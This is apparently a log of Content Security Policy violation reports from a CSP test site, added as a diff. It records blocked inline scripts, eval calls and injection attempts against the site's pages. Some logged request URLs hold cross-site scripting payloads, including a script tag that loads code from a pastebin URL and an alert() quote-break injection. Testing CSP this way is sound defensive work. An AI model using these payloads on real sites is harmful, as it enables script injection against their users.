@@ -1,0 +1,1963 @@
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 46
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 46
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 46
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 46
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/04_xsstc.php
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => alert(1);
+            [line-number] => 64
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => alert(1);
+            [line-number] => 64
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/06_meta-js-base64.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => alert(1);
+            [line-number] => 64
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/08_embedded_image.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => alert(1);
+            [line-number] => 64
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => alert(1);
+            [line-number] => 64
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/07_CRLF_injection.php
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 46
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/index.php
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 46
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/index.php
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 46
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/index.php
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 46
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/index.php
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 46
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/index.php
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 46
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 46
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/index.php
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 46
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/index.php
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 46
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02d_domjs_data_uri.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob HTTP/1.1
+            [blocked-uri] => self
+            [violated-directive] => eval script base restriction
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/01_inline.php?user=bob HTTP/1.1
+            [blocked-uri] => self
+            [violated-directive] => inline script base restriction
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 45
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob HTTP/1.1
+            [blocked-uri] => self
+            [violated-directive] => eval script base restriction
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/02c_domjs_function.php?user=bob HTTP/1.1
+            [blocked-uri] => self
+            [violated-directive] => eval script base restriction
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/01_inline.php?user=bob HTTP/1.1
+            [blocked-uri] => self
+            [violated-directive] => inline script base restriction
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 45
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php?user=bob%3Cscript%20src=%22http://pastebin.com/raw.php?i=1GM3BdJD%22%3E%3C/script%3E HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php?user=bob%3Cscript%20src=%22http://pastebin.com/raw.php?i=1GM3BdJD%22%3E%3C/script%3E HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [request] => GET http://cspv.mohrphium.com/03_prefetch.php?user=bob%3Cscript%20src=%22http://pastebin.com/raw.php?i=1GM3BdJD%22%3E%3C/script%3E HTTP/1.1
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/03_prefetch.php?user=bob%3Cscript%20src=%22http://pastebin.com/raw.php?i=1GM3BdJD%22%3E%3C/script%3E
+            [referrer] => 
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/03_prefetch.php?user=bob%3Clink%20id=1%20rel=%22prefetch%22%20href=%22http://pastebin.com/raw.php?i=1GM3BdJD%22%3E%3Cscript%20src=%22http://pastebin.com/raw.php?i=1GM3BdJD%22%3E%3C/script%3E
+            [referrer] => 
+            [blocked-uri] => http://pastebin.com/raw.php?i=1GM3BdJD
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/04_xsstc.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 45
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 45
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/index.php
+            [violated-directive] => script-src 'self' data:
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/data/comments.json
+            [referrer] => 
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 401
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/0
+            [referrer] => 
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 401
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/
+            [referrer] => 
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 401
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 45
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 45
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => view-source:http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => view-source:http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => -moz-tab-size: 4
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => view-source:http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => view-source:http://cspv.mohrphium.com/01_inline.php?user=bob
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => view-source:http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => view-source:http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => view-source:http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => view-source:http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [script-sample] => -moz-tab-size: 4
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02d_domjs_data_uri.php?user=bob%27;alert(1);//
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [blocked-uri] => self
